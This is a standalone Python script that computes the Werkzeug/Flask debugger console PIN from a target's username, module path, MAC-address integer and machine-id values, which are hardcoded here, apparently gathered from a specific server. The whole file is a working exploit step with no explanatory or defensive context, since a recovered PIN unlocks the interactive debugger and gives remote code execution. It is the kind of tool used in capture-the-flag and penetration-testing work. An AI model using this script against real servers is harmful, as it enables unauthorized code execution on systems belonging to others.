#!/usr/bin/python3
import hashlib
from itertools import chain

probably_public_bits = ['root', 'flask.app', 'Flask', '/usr/local/lib/python3.9/site-packages/flask/app.py']

private_bits = ['2485377892361', 'b74d9c2d-6b44-4cae-ba65-bc72beee82ef72e167d0b32f63740bd9e2c72f1a711a59903070e41f3c6a1ca6d8e563ab16ae']

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print("Key: "+rv)
